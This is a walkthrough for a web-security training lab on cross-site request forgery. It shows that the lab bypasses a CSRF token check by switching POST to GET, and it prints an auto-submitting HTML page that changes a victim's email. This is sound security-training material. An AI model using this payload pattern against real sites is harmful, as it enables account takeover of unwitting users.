![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/9dbbb300-cde7-4d78-ba88-30832fd88344)

### Solution

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/3acd90d8-a68b-4994-ab3a-f45e0fba9eb8)

we loggen in using the credentials, now update the email.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/69021f5f-9a10-4a36-907f-afa3bdca2a58)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/e6041aea-4f6b-4c25-a95a-6718814b41dd)

Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is shown as rejected.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/04fb218f-9fd8-4261-a532-002bc1dd50a1)

now we change the method from POST to GET

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/67b0b172-0a6a-4c48-9482-ed3441feb02c)

now it is succesfull

Right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Then change the email

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/ec73dc20-c419-4245-b93e-5cc3c5bc224d)

payload 

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a26009f0392618f84e465c4008f00dd.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="rahul&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".

now viewing the exploit

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/c870daf9-de40-46e5-8175-7e808d9dc23d)

click deliver to solve the lab

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/d727b1f6-380a-4211-8d83-4557669a6fbd)

